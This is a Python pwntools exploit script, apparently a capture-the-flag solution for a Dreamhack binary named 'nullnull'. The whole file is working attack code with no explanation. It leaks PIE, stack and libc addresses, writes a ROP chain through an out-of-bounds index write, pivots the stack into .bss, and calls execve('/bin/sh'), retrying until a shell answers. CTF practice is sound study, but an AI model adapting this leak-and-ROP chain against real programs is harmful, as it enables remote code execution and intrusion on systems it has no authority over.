from pwn import *

if args.LOCAL:
    io=process('./nullnull_patched')
    if args.GDB:
        cmd="""
        init-pwndbg
        brva 0x00000000000014e3
        """
        gdb.attach(io, cmd)
elif args.REMOTE:
    io=remote('host3.dreamhack.games', 11790)

elf=ELF('./nullnull_patched')
libc=ELF('./libc.so.6')

def leak(idx):
    io.sendline(str(3).encode())
    io.sendline(str(idx).encode())

def write(idx, value):
    io.sendline(str(2).encode())
    io.sendline(str(idx).encode())
    io.sendline(str(value).encode())
context.timeout=0.5
while True:
    try:
        #io=remote('host3.dreamhack.games', 11790)
        io=process('./nullnull_patched')
        io.sendline(str(3).encode())
        io.sendline(str(22).encode())
        io.sendline(str(1).encode())
        io.sendline(b'A'*80) # trigger


        io.recvuntil(b'A'*80)
        io.recvline()
        leak(1)
        pie=elf.address = int(io.recv(14), 10) - 0x1480
        print(hex(pie))
        print(hex(elf.plt.__isoc99_scanf))
        leak(2)
        io.recvline()
        stack=int(io.recv(15), 10) 
        print(hex(stack))

        pop_rdi=0x00000000000014e3+pie
        pop_rsi_r15=0x00000000000014e1+pie
        ret=pop_rdi+1
        pop_rsp=0x00000000000014dd+pie

        offset=3

        write(offset, pop_rdi)
        write(offset+1, elf.got.puts)
        write(offset+2, elf.sym.puts)
        write(offset+3, ret)
        write(offset+4, pop_rdi)
        write(offset+5, stack-0x90)
        write(offset+6, pop_rsi_r15)
        write(offset+7, elf.bss()+0x200)
        write(offset+8, 0)
        write(offset+9, elf.plt.__isoc99_scanf)
        write(offset+10, pop_rsp)
        write(offset+11, elf.bss()+0x200-8*3)
        write(offset+12, elf.bss()+0x200)
        write(offset+13, elf.bss()+0x200)
        write(offset+14, elf.bss()+0x200)
        write(offset+15, u16(b"%s"))


        io.sendline(str(4).encode())
        io.recvline()
        libc.address=u64(io.recv(6)+b'\0\0') - libc.sym.puts
        print(hex(libc.address))
        pop_rdx_r12=0x0000000000119241+libc.address
        pl=p64(pop_rdi)
        pl+=p64(next(libc.search(b'/bin/sh\0')))
        pl+=p64(pop_rsi_r15)
        pl+=p64(0)*2
        pl+=p64(pop_rdx_r12)
        pl+=p64(0)*2
        pl+=p64(libc.sym.execve)
        io.sendline(pl)
        io.sendline(b'id')
        if b'uid' in io.recvuntil(b'uid'):
            break
    except KeyboardInterrupt:
        exit(0)
    except (EOFError, ValueError):
        io.close()
        continue
    
io.interactive()
